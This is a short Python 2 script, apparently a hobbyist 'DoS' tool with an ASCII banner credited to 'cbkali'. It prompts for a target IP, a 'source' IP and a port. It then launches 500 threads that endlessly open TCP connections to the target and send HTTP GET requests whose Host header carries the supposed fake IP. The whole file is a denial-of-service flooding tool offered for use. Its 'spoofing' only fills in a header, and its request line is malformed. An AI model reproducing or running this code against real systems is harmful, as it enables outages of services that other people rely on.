#!/usr/bin/env python
import socket
import threading
import os

os.system("clear")
print("""                                                        
DDDDDDDDDDDDD                            SSSSSSSSSSSSSSS 
D::::::::::::DDD                       SS:::::::::::::::S
D:::::::::::::::DD                    S:::::SSSSSS::::::S
DDD:::::DDDDD:::::D                   S:::::S     SSSSSSS
  D:::::D    D:::::D    ooooooooooo   S:::::S            
  D:::::D     D:::::D oo:::::::::::oo S:::::S            
  D:::::D     D:::::Do:::::::::::::::o S::::SSSS         
  D:::::D     D:::::Do:::::ooooo:::::o  SS::::::SSSSS    
  D:::::D     D:::::Do::::o     o::::o    SSS::::::::SS  
  D:::::D     D:::::Do::::o     o::::o       SSSSSS::::S 
  D:::::D     D:::::Do::::o     o::::o            S:::::S
  D:::::D    D:::::D o::::o     o::::o            S:::::S
DDD:::::DDDDD:::::D  o:::::ooooo:::::oSSSSSSS     S:::::S
D:::::::::::::::DD   o:::::::::::::::oS::::::SSSSSS:::::S
D::::::::::::DDD      oo:::::::::::oo S:::::::::::::::SS 
DDDDDDDDDDDDD           ooooooooooo    SSSSSSSSSSSSSSS   

                                                       """)
print("Created by cbkali")


target = raw_input("Enter target ip address: ")
fake_ip = raw_input("Enter source ip address: ")
port = int(input("Enter port number:"))

def attack() :
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("HOST: " +fake_ip +"\r\n\r\n").encode('ascii'), (target, port))

for i in range(500):
	thread = threading.Thread(target=attack)
	thread.start()
